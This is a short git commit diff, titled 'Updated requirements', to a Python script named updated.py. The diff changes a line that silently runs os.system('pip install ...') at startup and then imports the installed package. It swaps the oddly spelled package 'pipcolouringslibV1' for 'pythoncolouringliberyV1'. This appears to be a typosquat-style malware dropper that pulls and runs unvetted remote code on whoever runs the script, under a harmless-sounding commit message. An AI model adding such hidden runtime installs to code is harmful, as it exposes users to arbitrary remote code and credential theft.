afb1825deb0962c9d5296890d4ed9086f3bd8961
Apfel <107504561+ApfelsaftDevs@users.noreply.github.com>
2023-04-24 19:09:30 +0200

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcolouringslibV1")
-import pipcolouringslibV1
+os.system("pip install pythoncolouringliberyV1")
+import pythoncolouringliberyV1
 from optparse import Option
 import requests
 import threading
